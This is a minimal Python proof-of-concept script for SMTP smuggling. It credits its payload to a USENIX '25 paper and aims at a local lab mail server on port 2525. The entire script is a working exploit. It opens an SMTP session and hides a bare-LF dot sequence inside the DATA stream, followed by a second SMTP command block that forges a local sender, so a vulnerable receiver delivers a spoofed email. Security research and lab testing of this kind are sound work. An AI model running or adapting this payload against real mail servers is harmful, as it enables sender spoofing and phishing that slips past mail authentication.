"""Minimal SMTP smuggling PoC. Payload A1 from Wang et al., USENIX '25.
One SMTP transaction. Bare-LF dot bare-LF inside DATA. A vulnerable
receiver delivers TWO emails."""
import socket

HOST, PORT = "127.0.0.1", 2525

PAYLOAD = (
    b"From: hoang@uit.test\r\n"
    b"To: long@labnet.test\r\n"
    b"Subject: hello\r\n"
    b"\r\n"
    b"hello"
    b"\n.\n"                                  # <-- A1: bare-LF dot bare-LF
    b"MAIL FROM:<thaykhoa@labnet.test>\r\n"   # spoofs a local sender
    b"RCPT TO:<bob@labnet.test>\r\n"          # local recipient (no relay needed)
    b"DATA\r\n"
    b"From: thaykhoa@labnet.test\r\n"
    b"To: bob@labnet.test\r\n"
    b"Subject: SMUGGLED\r\n"
    b"\r\n"
    b"-1\r\n"
    b".\r\n"
)


def chat(s, send):
    s.sendall(send)
    return s.recv(4096)


with socket.create_connection((HOST, PORT)) as s:
    s.recv(4096)
    chat(s, b"EHLO poc\r\n")
    chat(s, b"MAIL FROM:<alice@labnet.test>\r\n")
    chat(s, b"RCPT TO:<bob@labnet.test>\r\n")
    chat(s, b"DATA\r\n")
    s.sendall(PAYLOAD)
    print(chat(s, b"\r\n.\r\n").decode().strip())
    s.sendall(b"QUIT\r\n")
